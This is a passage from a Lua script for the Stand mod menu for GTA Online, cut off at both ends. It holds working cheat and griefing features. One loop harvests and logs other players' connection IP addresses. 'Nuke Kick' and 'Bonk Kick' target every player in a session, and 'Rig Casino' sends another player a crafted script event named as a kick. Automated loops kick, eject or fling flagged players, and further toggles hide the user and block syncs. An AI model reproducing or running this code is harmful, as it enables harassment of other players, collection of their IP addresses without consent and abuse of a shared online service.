Menu.trigger_commands("atomizeron" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
util.toast(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
util.log(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
else
util.yield(100)
end
end
end
end)

menu.toggle_loop(
    MenuModderDetections,
    "Get IP's",
    {},
    "Log's IP's",
    function()
        for _, csPID in ipairs(players.list(false, true, true)) do
            local print_ip = players.get_connect_ip(csPID)
            if print_ip == util.joaat(print_ip) then
                util.draw_debug_text(players.get_connect_ip(csPID) .. "(" .. print_ip .. ")")
                util.log(players.get_name(csPID) .. "(" .. print_ip .. ")")
            end
        end
    end
)


menu.toggle_loop(MenuModderDetections, "Godmode", {}, "Detects if someone is using godmode.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
for i, interior in ipairs(interior_stuff) do
if (players.is_godmode(csPID) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(csPID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(csPID) ~= 0 and get_interior_player_is_in(csPID) == interior then
util.draw_debug_text(players.get_name(csPID) .. " Is In Godmode")
break
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Godmode Auto Kick", {}, "Detects if someone is using godmode, blocks there joins and kicks them.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
for i, interior in ipairs(interior_stuff) do
if (players.is_godmode(csPID) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(csPID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(csPID) ~= 0 and get_interior_player_is_in(csPID) == interior then
menu.trigger_commands("Smart" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is In Godmode")
util.toast(players.get_name(csPID) .. "Is In Godmode")
break
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Vehicle Godmode", {}, "Detects if someone is using a vehicle that is in godmode.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
for i, interior in ipairs(interior_stuff) do
if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(csPID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(csPID) ~= 0 and get_interior_player_is_in(csPID) == interior then
util.draw_debug_text(players.get_name(csPID) .. "  Is In Vehicle Godmode")
break
end
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Vehicle Godmode Auto Kick", {}, "Detects if someone is using a vehicle that is in godmode, blocks there joins and kicks them.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
for i, interior in ipairs(interior_stuff) do
if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(csPID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(csPID) ~= 0 and get_interior_player_is_in(csPID) == interior then
menu.trigger_commands("Smart" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. "Is In Vehicle Godmode")
util.toast(players.get_name(csPID) .. "Is In Vehicle Godmode")
break
end
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Vehicle Godmode Auto Slingshot", {}, "Detects if someone is using a vehicle that is in godmode, then slingshots there vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
for i, interior in ipairs(interior_stuff) do
if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(csPID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(csPID) ~= 0 and get_interior_player_is_in(csPID) == interior then
menu.trigger_commands("slingshot" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. "Is In Vehicle Godmode")
util.toast(players.get_name(csPID) .. "Is In Vehicle Godmode")
break
end
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Vehicle Godmode Auto Kick Them Out", {}, "Detects if someone is using a vehicle that is in godmode, then kicks them out of the vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
for i, interior in ipairs(interior_stuff) do
if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(csPID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(csPID) ~= 0 and get_interior_player_is_in(csPID) == interior then
menu.trigger_commands("vehkick" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. "Is In Vehicle Godmode")
util.toast(players.get_name(csPID) .. "Is In Vehicle Godmode")
break
end
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Unreleased Vehicle", {}, "Detects if someone is using a vehicle that has not been released yet.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(unreleased_vehicles) do
if modelHash == util.joaat(name) then
util.draw_debug_text(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Unreleased Vehicle Auto Kick", {}, "Detects if someone is using a vehicle that has not been released yet, blocks there joins and Smart kicks them.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(unreleased_vehicles) do
if modelHash == util.joaat(name) then
menu.trigger_commands("Smart" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
util.toast(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Unreleased Car Auto Slingshot", {}, "Detects if someone is using a vehicle that has not been released yet, then slingshots there vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(unreleased_vehicles) do
if modelHash == util.joaat(name) then
menu.trigger_commands("slingshot" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
util.toast(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Unreleased Car Auto Kick Them Out", {}, "Detects if someone is using a vehicle that has not been released yet, then Kicks them out.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(unreleased_vehicles) do
if modelHash == util.joaat(name) then
menu.trigger_commands("vehkick" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
util.toast(players.get_name(csPID) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Weapon In Interior", {}, "Detects if you use a gun indoors", function()
for _, player_id in ipairs(players.list(false, true, true)) do
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
util.draw_debug_text(players.get_name(player_id) .. " Has a gun indoors")
break
end
end
end)

menu.toggle_loop(MenuModderDetections, "Modded Weapon", {}, "Detects if someone is using a weapon that can not be obtained in online.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
for i, hash in ipairs(modded_weapons) do
local weapon_hash = util.joaat(hash)
if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
util.draw_debug_text(players.get_name(csPID) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
break
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Modded Vehicle", {}, "Detects if someone is using a vehicle that can not be obtained in online.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(modded_vehicles) do
if modelHash == util.joaat(name) then
util.draw_debug_text(players.get_name(csPID) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
break
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Modded Vehicle Auto Slingshot", {}, "Detects if someone is using a vehicle that can not be obtained in online, then slingshots vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(modded_vehicles) do
if modelHash == util.joaat(name) then
menu.trigger_commands("slingshot" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
util.toast(players.get_name(csPID) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
break
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Modded Vehicle Auto Kick Them Out", {}, "Detects if someone is using a vehicle that can not be obtained in online, then kicks them out of the vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local modelHash = players.get_vehicle_model(csPID)
for i, name in ipairs(modded_vehicles) do
if modelHash == util.joaat(name) then
menu.trigger_commands("vehkick" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
util.toast(players.get_name(csPID) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
break
end
end
end
end)

menu.toggle_loop(MenuModderDetections, "Super Drive", {}, "Detects if the player is using super drive.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(csPID) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
util.draw_debug_text(players.get_name(csPID) .. " Is Using Super Drive")
break
end
end
end)

menu.toggle_loop(MenuModderDetections, "Super Drive Auto Slingshot", {}, "Detects if the player is using super drive, then slinghsots there vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(csPID) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
menu.trigger_commands("slingshot" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Using Super Drive")
util.toast(players.get_name(csPID) .. " Is Using Super Drive")
break
end
end
end)

menu.toggle_loop(MenuModderDetections, "Super Drive Auto Kick Them Out", {}, "Detects if the player is using super drive, then kicks them out of the vehicle.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(csPID) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
menu.trigger_commands("vehkick" .. players.get_name(csPID))
util.draw_debug_text(players.get_name(csPID) .. " Is Using Super Drive")
util.toast(players.get_name(csPID) .. " Is Using Super Drive")
break
end
end
end)

menu.slider(MenuNetwork, "Max Players To 32", {"maxplayers"}, "Set the maximum number of players in a session (only works when you are the host)", 1, 32, 32, 1, function (value)
if Stand_internal_script_can_run then
NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
util.toast("Slots are now free :)")
end
end)

menu.slider(MenuNetwork, "Max Spectators", {"maxSpectators"}, "Set the maximum number of observers (only works when you are the host)", 0, 2, 2, 1, function (value)
if Stand_internal_script_can_run then
NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
util.toast("Slots are now free :)")
end
end)

menu.action(MenuNetwork, "Start Fake Typing", {}, "Will show a typing indicator above your nickname and also make other addicts think that you're typing in chat", function()
menu.trigger_commands("hidetyping off")
for pids = 0, 31 do
if players.exists(pids) and pids ~= players.user() then
send_script_event(se.startfaketyping, pids, {players.user(), pids, 6769})
end
end
end)

menu.action(MenuNetwork, "Stop Fake Typing", {}, "", function()
for pids = 0, 31 do
if players.exists(pids) and pids ~= players.user() then
send_script_event(se.stopfaketyping, pids, {players.user(), pids, 7556})
end
end
end)

menu.toggle(MenuNetwork, "Anti-Type", {}, "AKA 'Suppress Typing Indicator', hides the fact that you're typing", function(on)
if on then
menu.trigger_commands("hidetyping on")
else
menu.trigger_commands("hidetyping off")
end
end)

menu.toggle_loop(MenuNetwork, "Clear All Notifications", {"clearnotifs"}, "Make sure you have log crash notifcations on and kick.", function()
Clear_Stand_Notifs = menu.ref_by_path("Stand>Clear Notifications")
Clear_Minimap_Notifs = menu.ref_by_path("Game>Remove Notifications Above Minimap")
menu.trigger_command(Clear_Stand_Notifs)
menu.trigger_command(Clear_Minimap_Notifs)
util.yield(1000)
end)

menu.action(MenuOnlineAll, "Nuke Kick", {"nuke"}, "Blocks the player join reaction then uses kick.", function()
    for i = 0, 31, 1 do
        if players.exists(i) and i ~= players.user() then
            local string PlayerName = players.get_name(i)
            local string PlayerNameLower = PlayerName:lower()
            menu.trigger_command(menu.ref_by_command_name("nuke"..PlayerNameLower))
        end
    end
end)

menu.action(MenuOnlineAll, "Bonk Kick", {"bonk"}, "Contains 6 SE kicks.", function()
    for i = 0, 31, 1 do
        if players.exists(i) and i ~= players.user() then
            local string PlayerName = players.get_name(i)
            local string PlayerNameLower = PlayerName:lower()
            menu.trigger_command(menu.ref_by_command_name("bonk"..PlayerNameLower))
        end
    end
end)

menu.toggle(MenuNetwork, "Rig Casino", {"rigcasino"}, "Teleports them to casino then turns on the tables. It will spawn you to the table if you select it for yourself.", function(on_toggle)
if on_toggle then
local player_ped = PLAYER.PLAYER_PED_ID()
local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
local pld = PLAYER.GET_PLAYER_PED(pid)
local pos = ENTITY.GET_ENTITY_COORDS(pld)
menu.trigger_commands("casinotp" .. PLAYER.GET_PLAYER_NAME(pid))
send_script_event(se.kick1_casino, pid, {4, 123, 0, 0, 1, -1001291848, -1016910157, 1108672448, 0, -1, 0, 2147483647, 0, -1}) -- Casino Invite
util.yield(1500)
menu.trigger_commands("rigblackjack")
menu.trigger_commands("rigroulette ".. "1")
util.yield(1500)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1132.2958, 263.93478, -51.035763)
menu.trigger_commands("casinohelp1")
menu.trigger_commands("casinohelp2")
else
menu.trigger_commands("rigblackjack")
menu.trigger_commands("rigroulette ".. "-1")
local player_ped = PLAYER.PLAYER_PED_ID()
local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
local pld = PLAYER.GET_PLAYER_PED(pid)
local pos = ENTITY.GET_ENTITY_COORDS(pld)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 924.2497, 46.7545, 81.0961)
end
end)

menu.action(MenuWeapon, "Give Ammo", {"giveammo"}, "Give ammo for current weapon (fix for stand unlimited ammo not working with special ammo)", --done
function(on_click)
    local curr_equipped_weapon = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED(players.user()))
    WEAPON.ADD_AMMO_TO_PED(PLAYER.GET_PLAYER_PED(players.user()), curr_equipped_weapon, 10)
end
)

menu.toggle_loop(MenuSelf, "Fast Roll", {"fastroll"}, "", function()
STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 200, true)
end)

menu.toggle(MenuSelf, "Quiet footsteps", {"quietsteps"}, "Disables the sound of your footsteps.", function(toggle)
AUDIO.SET_PED_FOOTSTEPS_EVENTS_ENABLED(players.user_ped(), not toggle)
end)

local max_health
undead_otr = menu.toggle(MenuSelf, "Undead OTR", {"undead"}, "Turn you off the radar without notifying other players.\nNote: Trigger Modded Health detection.", function(on_toggle)
if on_toggle then
max_health = ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped())
while menu.get_state(undead_otr) == "On" do
if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(),0)
end
util.yield()
end
else
ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(),max_health)
end
end)

menu.toggle(MenuSelf, "Hulk Mode", {"hulkmode"}, "Makes you jump high and very strong", function(toggle)
if toggle then
menu.trigger_commands("damagemultiplier 10000")
menu.trigger_commands("superjump")
util.toast("Hulk Mode On")
else
menu.trigger_commands("damagemultiplier 1.01")
menu.trigger_commands("damagemultiplier 1")
menu.trigger_commands("superjump")
util.toast("Hulk Mode Off")
end
end)

menu.toggle(MenuSelf, "Toggle Sneaky Mode", {"sneakymode"}, "Turns you invisible, off radar, blocks outgoing syncs and no collisions with quietsteps...", function(on_toggle)
if on_toggle then
menu.trigger_commands("invisibility" .. " on")
menu.trigger_commands("reducedcollision" .. " on")
menu.trigger_commands("otr")
menu.trigger_commands("quietsteps")
menu.trigger_commands("undead")
menu.trigger_commands("desyncall")
util.toast("Sneaky Mode On\n" .. "\n" .. "No one can see you now!")
else
menu.trigger_commands("invisibility" .. " off")
menu.trigger_commands("reducedcollision" .. " off")
menu.trigger_commands("otr")
menu.trigger_commands("quietsteps")
menu.trigger_commands("undead")
menu.trigger_commands("desyncall")
util.toast("Sneaky Mode Off\n" .. "\n" .. "Everyone can see you now!")
end
end)

   menu.toggle_loop(MenuHealth, 'Full regen', {'slowfullRegen'}, 'Makes your hp regenerate until you\'re at full health.', function()
        local health = ENTITY.GET_ENTITY_HEALTH(players.user_ped())
        if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) == health then return end
        ENTITY.SET_ENTITY_HEALTH(players.user_ped(), health + 5, 0)
        util.yield(255)
    end)

 menu.toggle_loop(MenuSelf, 'Better clumsiness', {'idclumsy'}, 'Like stands clumsiness, but you can get up after you fall.', function()
            if PED.IS_PED_RAGDOLL(players.user_ped()) then util.yield(3000) return end
            PED.SET_PED_RAGDOLL_ON_COLLISION(players.user_ped(), true)
        end)

        menu.action(MenuSelf, 'Stumble', {'idstumble'}, 'Makes you stumble with a good chance of falling over.', function()
            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
            PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
        end)

menu.action(MenuVehVisual, "Candy Paint", {"candypaint"}, "", function()
candy_paint(true)
end)

function upgrade_vehicle(Player)
local vehicle = get_player_veh(player,true)
if vehicle then
DECORATOR.DECOR_SET_INT(vehicle, "MPBitset", 0)
VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
for i = 0 ,50 do
VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 13, false)
end
VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 80, 0, 255, chrome)
VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle,80, 0, 255, chrome)
VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, 10)
VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 17, true)
VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 19, true)
VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 21, true)
for i = 0 ,4 do
if not VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, i) then
VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, i, true)
end
end
VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, 255, 0, 255)
VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, 1)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "menu")
end
end

function candy_paint(Player)
menu.trigger_commands("perfwithspoiler")
menu.trigger_commands("vehprimaryred" .. " 80")
menu.trigger_commands("vehprimarygreen" .. " 0")
menu.trigger_commands("vehprimaryblue" .. " 255")
local Chrome_Paint_Primary = menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Primary Colour>Finish>Chrome")
util.yield(500)
menu.trigger_command(Chrome_Paint_Primary)
local Chrome_Paint_Secondary = menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Secondary Colour>Finish>Chrome")
menu.trigger_commands("vehsecondaryred" .. " 80")
menu.trigger_commands("vehsecondarygreen" .. " 0")
menu.trigger_commands("vehsecondaryblue" .. " 255")
util.yield(500)
menu.trigger_command(Chrome_Paint_Secondary)
VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, 1)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "xCandyx")
end

function upgrade_own_vehicle_random(Player)
util.yield(1000)
menu.trigger_commands("tune")
menu.trigger_commands("vehprimaryred" .. " 80")
menu.trigger_commands("vehprimarygreen" .. " 0")
menu.trigger_commands("vehprimaryblue" .. " 255")
local Chrome_Paint_Primary = menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Primary Colour>Finish>Chrome")
util.yield(3000)
menu.trigger_command(Chrome_Paint_Primary)
local Chrome_Paint_Secondary = menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Secondary Colour>Finish>Chrome")
menu.trigger_commands("vehsecondaryred" .. " 80")
menu.trigger_commands("vehsecondarygreen" .. " 0")
menu.trigger_commands("vehsecondaryblue" .. " 255")
util.yield(3000)
menu.trigger_command(Chrome_Paint_Secondary)
VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, 1)
VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "menu")
util.toast("RC Bombs are now ready")
util.log("RC Bombs are now ready")
end

drift = false
menu.toggle(MenuVehMovement, "Shift to Drift", {"driftmode"}, "", function(on_toggle)
drift = on_toggle
end)

menu.toggle_loop(MenuVehMovement, "Engine Always On", {"alwayson"}, "", function()
if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
VEHICLE.SET_VEHICLE_LIGHTS(vehicle, 0)
VEHICLE.SET_VEHICLE_HEADLIGHT_SHADOWS(vehicle, 2)
end
end)

menu.toggle(MenuVehMovement, "Drive Cop Heli", {"copheli"}, "Plus bodygaurds.", function(on_toggle)
if on_toggle then
menu.trigger_commands("bodyguardmodel S_M_Y_Swat_01")
menu.trigger_commands("bodyguardcount 3")
menu.trigger_commands("bodyguardweapon smg")
menu.trigger_commands("spawnbodyguards")
menu.trigger_commands("smyswat01")
menu.trigger_commands("undead")
menu.trigger_commands("otr")
local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
util.yield(3000)
menu.trigger_command(Imortality_BodyGuards)
util.toast("Make way for the heli.")
util.yield(3000)
local vehicleHash = util.joaat("polmav")
request_model(vehicleHash)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
copheli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
--ENTITY.SET_ENTITY_VISIBLE(copheli, false, false)
--ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false, true)
VEHICLE.SET_VEHICLE_ENGINE_ON(copheli, true, true, true)
ENTITY.SET_ENTITY_INVINCIBLE(copheli, true)
VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(copheli, 0.0)
local id = get_closest_vehicle(entity)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(copheli, pos.x, pos.y, pos.z, false, false, true)
PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), copheli, -1)
util.yield(1500)
menu.trigger_commands("livery -1")
else
local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
menu.trigger_command(Imortality_BodyGuards)
menu.trigger_commands("delbodyguards")
menu.trigger_commands("deletevehicle")
menu.trigger_commands("mpfemale")
menu.trigger_commands("undead")
menu.trigger_commands("otr")
util.toast("Change you're outfit to get clothes normal again.")
end
end)

menu.toggle(MenuVehMovement, "Drive Cop Car", {"copcar"}, "Plus a bodygaurd.", function(on_toggle)
if on_toggle then
menu.trigger_commands("bodyguardmodel S_M_Y_Cop_01")
menu.trigger_commands("bodyguardcount 1")
menu.trigger_commands("bodyguardweapon pistol")
menu.trigger_commands("spawnbodyguards")
menu.trigger_commands("SMYCop01")
menu.trigger_commands("undead")
menu.trigger_commands("otr")
local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
util.yield(1000)
menu.trigger_command(Imortality_BodyGuards)
local vehicleHash = util.joaat("police3")
request_model(vehicleHash)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
copheli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
VEHICLE.SET_VEHICLE_ENGINE_ON(copheli, true, true, true)
ENTITY.SET_ENTITY_INVINCIBLE(copheli, true)
VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(copheli, 0.0)
VEHICLE.SET_VEHICLE_MOD_KIT(copheli, -1)
local id = get_closest_vehicle(entity)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(copheli, pos.x, pos.y, pos.z, false, false, true)
PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), copheli, -1)
else
local Imortality_BodyGuards = menu.ref_by_path("Self>Bodyguards>Immortality")
menu.trigger_command(Imortality_BodyGuards)
menu.trigger_commands("delbodyguards")
menu.trigger_commands("deletevehicle")
menu.trigger_commands("mpfemale")
menu.trigger_commands("undead")
menu.trigger_commands("otr")
util.toast("Change you're outfit to get clothes normal again.")
end
end)

menu.toggle_loop(MenuVehMovement, 'Stick to surface', {'stickyveh'}, 'Warning! Spawn a vehicle or self crashh! Makes it to where the vehicle sticks to walls(using horn boost on the lowest setting helps get up on the walls, skidded from ajoker script.', function(curcar)
local curcar = entities.get_user_vehicle_as_handle()
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
util.toast("Player isn't in a vehicle. :/")
return
end
ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, 0, 0, - 0.5, 0, true, true, true, true)
VEHICLE.MODIFY_VEHICLE_TOP_SPEED(curcar, 40)
end)

menu.toggle_loop(MenuVehMovement,"Horn boost", {"hornboost"}, "Gives you the ability to speed up their car by pressing honking their horn or activating the siren. Will try fix it for other players soon.", function()
local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
if not (AUDIO.IS_HORN_ACTIVE(vehicle) or VEHICLE.IS_VEHICLE_SIREN_ON(vehicle)) then return end
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
if AUDIO.IS_HORN_ACTIVE(vehicle) then
